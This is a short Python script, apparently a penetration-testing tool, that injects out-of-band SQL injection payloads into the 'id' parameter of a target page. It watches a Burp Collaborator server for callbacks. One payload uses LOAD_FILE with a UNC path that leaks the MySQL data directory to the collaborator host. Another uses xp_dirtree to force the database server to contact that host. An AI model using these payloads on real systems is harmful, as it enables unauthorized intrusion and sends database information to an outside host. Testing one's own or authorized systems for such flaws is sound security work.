import requests
from burp_collaborator import BurpCollaborator

url = "https://example.com/vulnerable_page.php"
param = "id"

def test_oob_sqli_payload(collab_server, payload):
    injected_url = f"{url}?{param}={payload}"
    requests.get(injected_url)
    interactions = collab_server.fetch_and_cleanup()

    return interactions

def main():
    collab_server = BurpCollaborator()
    collab_subdomain = collab_server.get_collaborator_subdomain()

    payloads = [
        f"1; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@datadir), '\\\\{collab_subdomain}.txt'))",
        f"1; SELECT xp_dirtree('\\\\{collab_subdomain}')"
    ]

    for payload in payloads:
        interactions = test_oob_sqli_payload(collab_server, payload)
        if interactions:
            print(f"OOB SQLi vulnerability found with payload: {payload}")
            break
    else:
        print("No Out-of-Band SQLi vulnerability found")

if __name__ == "__main__":
    main()
